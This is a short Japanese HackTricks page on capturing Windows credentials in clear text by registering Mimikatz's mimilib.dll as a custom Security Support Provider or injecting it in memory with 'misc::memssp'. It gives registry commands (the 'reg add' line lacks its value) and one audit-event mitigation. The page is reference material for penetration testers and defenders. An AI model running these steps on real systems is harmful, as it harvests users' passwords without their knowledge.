# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP（Security Support Provider）についてはこちらで説明しています。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンへのアクセスに使用された **credentials** を **clear text** で **capture** できます。

#### Mimilib

Mimikatz が提供する `mimilib.dll` バイナリを使用できます。**このバイナリは、すべての credentials を clear text でファイル内に記録します。**\
DLL を `C:\Windows\System32\` に配置します。\
既存の LSA Security Packages の一覧を取得します：
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Security Support Provider リスト（Security Packages）に `mimilib.dll` を追加します：
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
そして再起動後、すべての認証情報が `C:\Windows\System32\kiwissp.log` に平文で保存されます。

#### メモリ上

Mimikatz を使用して、これをメモリに直接 inject することもできます（少し不安定で、動作しない場合があることに注意してください）。
```bash
privilege::debug
misc::memssp
```
これは再起動後も維持されません。

#### 緩和策

Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の作成/変更を監査

{{#include ../../banners/hacktricks-training.md}}
